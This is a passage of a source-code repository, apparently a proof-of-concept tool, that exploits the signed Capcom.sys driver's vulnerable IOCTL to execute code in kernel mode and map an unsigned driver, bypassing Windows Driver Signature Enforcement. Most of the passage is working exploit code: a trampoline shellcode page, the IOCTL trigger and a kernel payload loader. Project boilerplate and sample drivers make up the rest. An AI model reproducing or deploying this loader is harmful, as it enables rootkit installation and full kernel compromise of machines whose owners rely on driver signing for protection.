	PVOID drvmap = K_GetRoutine(ExAllocatePoolWithTag)(NonPagedPoolExecute, PayloadSize, '\0kdD');
	if (drvmap)
	{
		// Nice intrinsic trick from https://github.com/Professor-plum/Reflective-Driver-Loader/blob/master/Hadouken/Hadouken.c
		__movsq((PDWORD64)drvmap, (PDWORD64)PayloadImage, (SIZE_T)(PayloadSize / sizeof(INT64)));

		PayloadEntry = MakePointer<decltype(PayloadEntry)>(drvmap, PayloadEntryRVA);
		PayloadEntry(NULL, NULL);
	}
	return nullptr;
}

bool CapcomDriver::EnsureValidTarget()
{
	// TODO: Add OS checks
	return true;
}

bool CapcomDriver::EnsureDriverLoaded()
{
	m_CapcomHandle = Util::Win32::unique_handle
	{
		CreateFile(CAPCOM_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)
	};

	return m_CapcomHandle.get() != INVALID_HANDLE_VALUE;
}

void CapcomDriver::Exploit()
{
	Util::Debug::Print("CapcomDriver::Exploit()\n", PayloadImage);

	Options.Image->MapForKernel();

	PayloadImage = Options.Image->GetMappedBase();
	PayloadSize = Options.Image->GetMappedSize();
	PayloadEntryRVA = Options.Image->GetEntryPointRVA();

	Util::Debug::Print("Mapped Capcom.sys to: %p\n", PayloadImage);
	Util::Debug::Print("EntryPointRVA: %p\n", PayloadEntryRVA);

	ExecIoCtlWithTrampoline(CapcomDriver::LoaderPayload);

}

const std::wstring & CapcomDriver::GetVulnDriverName()
{
	return m_DriverName;
}

PPAYLOADTRAMP CapcomDriver::AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// Allocate executable page for payload
	m_Payload = Util::Win32::unique_virtalloc<TRAMPPAGE>
	{
		reinterpret_cast<PTRAMPPAGE>
		(
			VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
		)
	};

	if (!m_Payload.get()) Util::Exception::ThrowLastError("VirtualAlloc");

	m_Payload->TrampAddr = &m_Payload->TrampData;

	// sti; jmp qword [PayloadAddr]
	m_Payload->TrampData = {
		{ 0xFB, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 }, // sti; jmp qword [rip+7]
		targetFunc,
	};

	return &m_Payload->TrampData;
}

void CapcomDriver::ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc)
{
	// For passing to DeviceIoControl. The driver doesn't do anything with these.
	DWORD dummyOutBuf, dummyBytesReturned;

	// VirtualAlloc a trampoline payload
	PPAYLOADTRAMP payload = AllocPayloadTrampoline(targetFunc);

	// Trigger the payload by sending the address of the payload as InBuf. The driver will then disable SMEP and then execute our payload trampoline
	// which will jump to the function specified during the creation of the payload.
	auto bRes = DeviceIoControl(m_CapcomHandle.get(), CAPCOM_DEVICE_IOCTL64, reinterpret_cast<LPVOID>(&payload), 8, &dummyOutBuf, 4, &dummyBytesReturned, nullptr);
	if (!bRes) Util::Exception::ThrowLastError(L"DeviceIoControl");
}


```

`CapcomLib/VulnDrivers/CapcomDriver.h`:

```h
#pragma once
#include "BaseVulnDriver.h"

// The name of the device that the capcom driver exposes to usermode. Does not change.
#define CAPCOM_DEVICE_NAME L"\\\\.\\Htsysm72FB"

// The exploitable IOCTL that, when called on the capcom device above, will trigger the payload
#define CAPCOM_DEVICE_IOCTL64 0xAA013044

// Driver calls function passing the address of MmGetSystemRoutineAddress as the first argument
// No kernel leak required
typedef PVOID(NTAPI *CAPCOM_USER_FUNC)(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress);

// Struct idea from:
// https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp

#include <pshpack1.h>
// Trampoline to the actual shellcode. Uses 'sti' to re-enable interrupts to prevent BSOD on pagefault.
// Because interrupts are enabled, our shellcode has to be real quick or else the scheduler will switch
// out to a different thread and our actual payload will be paged out.
typedef struct _PAYLOADTRAMP
{
	// sti; jmp qword [PayloadTarget]
	BYTE TrampAsm[7];

	PVOID PayloadTarget;
} PAYLOADTRAMP, *PPAYLOADTRAMP;
#include <poppack.h>

// Pointer to the executable page containing the shellcode.
// This is the only real good way to initialize the bytes of the trampoline with C syntax
typedef struct _TRAMPPAGE
{
	// This is just a weird quirk with the driver. The driver checks to ensure that [TrampData-8] == TrampAddr... okay sure
	PPAYLOADTRAMP TrampAddr;
	PAYLOADTRAMP TrampData;
} TRAMPPAGE, *PTRAMPPAGE;

class CapcomDriver : public BaseVulnDriver
{
public:
	// Inherited via IVulnDriver
	virtual bool EnsureValidTarget() override;

	virtual bool EnsureDriverLoaded() override;

	virtual void Exploit() override;

	virtual const std::wstring& GetVulnDriverName() override;

private:

	// Run from kernel mode
	static PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress);

	static PVOID PayloadImage;
	static SIZE_T PayloadSize;
	static DWORD PayloadEntryRVA;
	static void(__stdcall *PayloadEntry)(PVOID DriverObject, PVOID RegistryEntry);

	// Name of the driver to load from the vulnerable driver storage
	const std::wstring m_DriverName = L"Capcom.sys";

	// Handle to the device object
	Util::Win32::unique_handle m_CapcomHandle;

	PPAYLOADTRAMP AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc);

	void ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc);

	Util::Win32::unique_virtalloc<TRAMPPAGE> m_Payload;
};
```

`CapcomLib/VulnDrivers/IVulnDriver.h`:

```h
#pragma once
#include "stdafx.h"

class IVulnDriver
{
public:

	// Map the driver located at DriverLocation with service display name DisplayName
	virtual bool MapDriver(const std::wstring& DriverLocation, const std::wstring& DisplayName) = 0;

	// Ensure machine is vulnerable, etc.
	// Called before the target driver is prepared to be mapped
	// Return false to stop the loading process
	virtual bool EnsureValidTarget() = 0;

	// Ensure that the vulnerable driver loaded correctly.
	// Typically checking for the existance of a device
	virtual bool EnsureDriverLoaded() = 0;

	// Prepare shellcode and exploit vulnerable driver
	// Throwing an exception will cause a cleanup
	virtual void Exploit() = 0;

	// Unloads vulnerable driver and cleans up
	virtual void Cleanup() = 0;

	// Returns the name of the driver file of this vulnerable driver class
	virtual const std::wstring& GetVulnDriverName() = 0;
};
```

`CapcomLib/VulnDrivers/stdafx.h`:

```h
#pragma once
#include "..\stdafx.h"
```

`CapcomLib/Win32Kernel.h`:

```h
#pragma once

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/ne-wdm-_pool_type
typedef enum _POOL_TYPE {
	NonPagedPool,
	NonPagedPoolExecute = NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed = NonPagedPool + 2,
	DontUseThisType,
	NonPagedPoolCacheAligned = NonPagedPool + 4,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
	MaxPoolType,
	NonPagedPoolBase = 0,
	NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
	NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
	NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
	NonPagedPoolSession = 32,
	PagedPoolSession = NonPagedPoolSession + 1,
	NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
	DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
	NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
	PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
	NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
	NonPagedPoolNx = 512,
	NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
	NonPagedPoolSessionNx = NonPagedPoolNx + 32
} POOL_TYPE;

/// Defines a static UNICODE_STRING
#define DECLARE_UNICODE_STRING(_var, _string) \
	WCHAR _var ## _buffer[] = _string; \
	__pragma(warning(push)) \
	__pragma(warning(disable:4221)) __pragma(warning(disable:4204)) \
	UNICODE_STRING _var = { sizeof(_string)-sizeof(WCHAR), sizeof(_string), (PWCH)_var ## _buffer } \
	__pragma(warning(pop))

//// https://forum.sysinternals.com/using-rtlinitunicodestring-in-cpp-code_topic20109.html
//inline VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, const WCHAR * SourceString)
//{
//	DestinationString->Buffer = (PWCHAR)(SourceString);
//	DestinationString->MaximumLength = DestinationString->Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR));
//}

/// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-exallocatepoolwithtag
typedef PVOID(NTAPI *ExAllocatePoolWithTagFunc)(
	POOL_TYPE    PoolType,
	SIZE_T    NumberOfBytes,
	ULONG     Tag);

/// MMGetSystemRoutine is the GetProcAddress of the kernel. Capcom.sys passes us the address
/// of this function as the first argument
typedef PVOID(NTAPI *MmGetSystemRoutineFunc)(PUNICODE_STRING SystemRoutineName);

// From Process Hacker for NtQuerySystemInformation
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	CHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


using modules_map = std::unordered_map<std::string, RTL_PROCESS_MODULE_INFORMATION>;

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)11
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

```

`CapcomLib/Win32Util.h`:

```h
#pragma once

#include "stdafx.h"
#include "Winternl.h"
#include "Util.h"

namespace Util
{
	namespace Win32
	{
		// Auto deleter for C++ smart pointers for Win32 Handles
		struct Win32HandleDeleter
		{
			void operator()(HANDLE handle)
			{
				if (handle != nullptr)
				{
					::CloseHandle(handle);
				}
			}
		};

		// C++ Smart Pointer for Win32 Handles
		using unique_handle = std::unique_ptr<void, Win32HandleDeleter>;

		// Auto deleter for C++ smart pointers for Win32 LoadLibrary
		struct Win32ModuleDeleter
		{
			void operator()(void* handle)
			{
				if (handle != nullptr)
				{
					::FreeLibrary((HMODULE)handle);
				}
			}
		};

		// C++ Smart Pointer for Win32 Handles
		using unique_module = std::unique_ptr<void, Win32ModuleDeleter>;

		// Auto deleter for C++ smart pointers for VirtualAlloc memory
		struct VirtualFreeDeleter
		{
			void operator()(LPVOID mem)
			{
				if (mem != nullptr)
				{
					auto ret = ::VirtualFree(mem, 0, MEM_RELEASE);

					// Should this throw an exception?
					if (!ret) Util::Exception::ThrowLastError("VirtualFree");
				}
			}
		};

		// C++ Smart Pointer for VirtualAlloc memory
		template<typename PtrType = VOID>
		using unique_virtalloc = std::unique_ptr<PtrType, VirtualFreeDeleter>;

		// Creates an ownership-managed object that creates a UNICODE_STRING from a wstring
		template <class StrClass>
		class UnicodeStringWrapper : public UNICODE_STRING
		{
		public:
			StrClass innerStr;

			UnicodeStringWrapper(const StrClass& _innerStr)
			{
				innerStr = _innerStr;
				::RtlInitUnicodeString(this, innerStr.c_str());
			}
		};

		// Converts a native Nt path into a win32 DOS path
		// Uses internal NtCreateFile to get the file handle for the native path
		// Then uses API function GetFinalPathNameByHandle to get the DOS path
		inline std::string NtNativeToWin32(const std::wstring& NtNativePath)
		{
			DWORD dwRet;
			OBJECT_ATTRIBUTES  objAttr;
			HANDLE handle;
			IO_STATUS_BLOCK    ioStatusBlock = { 0 };

			auto Path = std::string{};
			Path.resize(MAX_PATH);
			auto uniNativePath = UnicodeStringWrapper<std::wstring>{ NtNativePath };

			InitializeObjectAttributes(&objAttr, (PUNICODE_STRING)&uniNativePath,
				OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
				NULL, NULL);

			auto ntstatus = NtCreateFile(&handle,
				GENERIC_READ,
				&objAttr,
				&ioStatusBlock,
				NULL,
				FILE_ATTRIBUTE_NORMAL,
				FILE_SHARE_READ,
				FILE_OPEN,
				FILE_NON_DIRECTORY_FILE,
				NULL,
				0);

			if (!NT_SUCCESS(ntstatus))
			{
				return Path;
			}

			dwRet = GetFinalPathNameByHandleA(handle, &Path[0], MAX_PATH, VOLUME_NAME_DOS);
			CloseHandle(handle);
			return Path;
		}
	}
}

```

`CapcomLib/main.cpp`:

```cpp
// CapcomLib.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "DriverLoader.h"
#include "PELoader.h"
#include "PEFile.h"
#include "KernelHelp.h"

#include "VulnDrivers\CapcomDriver.h"
int main()
{
	try
	{
		CapcomDriver driver;
		driver.MapDriver(Util::Path::RelativeToAbsolute(L"TestDriver.sys"), L"Capcom");
	}
	catch (std::exception e)
	{
		Util::Debug::Print("[EXCEPTION] %s\n", e.what());
	}
	
	
	getchar();
    return 0;
}

 
```

`CapcomLib/stdafx.cpp`:

```cpp
// stdafx.cpp : source file that includes just the standard includes
// CapcomLib.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

// TODO: reference any additional headers you need in STDAFX.H
// and not in this file

```

`CapcomLib/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <Psapi.h>

#include <intrin.h>
#include <Shlwapi.h>
#include <iostream>

#include <string>
#include <fstream>
#include <streambuf>
#include <sstream>
#include <memory>
#include <vector>
#include <unordered_map>
#include <cctype>
#include <algorithm>
#include <locale>
#include <codecvt>
#include <list>
#include <winternl.h>
#include <random>
#include <type_traits>

#include "Win32Kernel.h"
```

`CapcomLib/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`HelloWorldPE/HelloWorldPE.cpp`:

```cpp
// HelloWorldPE.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


int main()
{
	printf("Hello World!\n");
	getchar();
    return 0;
}


```

`HelloWorldPE/HelloWorldPE.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{5E259D52-721C-4B7B-93F0-7D8273832E4A}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>HelloWorldPE</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.15063.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="HelloWorldPE.cpp" />
    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HelloWorldPE/HelloWorldPE.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HelloWorldPE.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`HelloWorldPE/ReadMe.txt`:

```txt
========================================================================
    CONSOLE APPLICATION : HelloWorldPE Project Overview
========================================================================

AppWizard has created this HelloWorldPE application for you.

This file contains a summary of what you will find in each of the files that
make up your HelloWorldPE application.


HelloWorldPE.vcxproj
    This is the main project file for VC++ projects generated using an Application Wizard.
    It contains information about the version of Visual C++ that generated the file, and
    information about the platforms, configurations, and project features selected with the
    Application Wizard.

HelloWorldPE.vcxproj.filters
    This is the filters file for VC++ projects generated using an Application Wizard. 
    It contains information about the association between the files in your project 
    and the filters. This association is used in the IDE to show grouping of files with
    similar extensions under a specific node (for e.g. ".cpp" files are associated with the
    "Source Files" filter).

HelloWorldPE.cpp
    This is the main application source file.

/////////////////////////////////////////////////////////////////////////////
Other standard files:

StdAfx.h, StdAfx.cpp
    These files are used to build a precompiled header (PCH) file
    named HelloWorldPE.pch and a precompiled types file named StdAfx.obj.

/////////////////////////////////////////////////////////////////////////////
Other notes:

AppWizard uses "TODO:" comments to indicate parts of the source code you
should add to or customize.

/////////////////////////////////////////////////////////////////////////////

```

`HelloWorldPE/stdafx.cpp`:

```cpp
// stdafx.cpp : source file that includes just the standard includes
// HelloWorldPE.pch will be the pre-compiled header
// stdafx.obj will contain the pre-compiled type information

#include "stdafx.h"

// TODO: reference any additional headers you need in STDAFX.H
// and not in this file

```

`HelloWorldPE/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#include <stdio.h>
#include <tchar.h>



// TODO: reference additional headers your program requires here

```

`HelloWorldPE/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`README.md`:

```md
# What is this?
A reflexive driver loader to bypass Windows DSE (featuring a custom PE loader)

[Driver Signing Enforcement](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/driver-signing) is the Windows 7+ kernel driver verification that ensures that only signed drivers can be loaded on a system that does not have Test Mode enabled. This project by default will exploit the capcom.sys rootkit to load an unsigned driver and bypass DSE. It also provides a simple system to support exploitation of other known signed exploitable drivers to achieve the same effect.

# What do I do with this?
It's a PE loader that links against running kernel modules. It's all proof of concept code for my own use, so I can't help you if it breaks or doesn't compile. It's in a working state right now, so feel free to use any part of it.

```

`SimpleDriver/Driver.c`:

```c
#include <ntddk.h>

VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("%s\n", "Driver unloaded.");
	DriverObject;
	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath)
{
	DbgPrint("%s\n", "Driver has been loaded.");
	(*DriverObject).DriverUnload = Unload;
	regPath;
	return (STATUS_SUCCESS);
}
```

`SimpleDriver/SimpleDriver.inf`:

```inf
;
; SimpleDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=SimpleDriver.cat
DriverVer= ; TODO: set DriverVer in stampinf property pages

[DestinationDirs]
DefaultDestDir = 12
SimpleDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
SimpleDriver.sys  = 1,,
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll=1 ; make sure the number matches with SourceDisksNames

;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]
%SimpleDriver.DeviceDesc%=SimpleDriver_Device, Root\SimpleDriver ; TODO: edit hw-id

[SimpleDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
SimpleDriver.sys

;-------------- Service installation
[SimpleDriver_Device.NT.Services]
AddService = SimpleDriver,%SPSVCINST_ASSOCSERVICE%, SimpleDriver_Service_Inst

; -------------- SimpleDriver driver install sections
[SimpleDriver_Service_Inst]
DisplayName    = %SimpleDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\SimpleDriver.sys

;
;--- SimpleDriver_Device Coinstaller installation ------
;

[SimpleDriver_Device.NT.CoInstallers]
AddReg=SimpleDriver_Device_CoInstaller_AddReg
CopyFiles=SimpleDriver_Device_CoInstaller_CopyFiles

[SimpleDriver_Device_CoInstaller_AddReg]
HKR,,CoInstallers32,0x00010000, "WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll,WdfCoInstaller"

[SimpleDriver_Device_CoInstaller_CopyFiles]
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll

[SimpleDriver_Device.NT.Wdf]
KmdfService =  SimpleDriver, SimpleDriver_wdfsect
[SimpleDriver_wdfsect]
KmdfLibraryVersion = $KMDFVERSION$

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "SimpleDriver Installation Disk"
SimpleDriver.DeviceDesc = "SimpleDriver Device"
SimpleDriver.SVCDESC = "SimpleDriver Service"

```

`SimpleDriver/SimpleDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
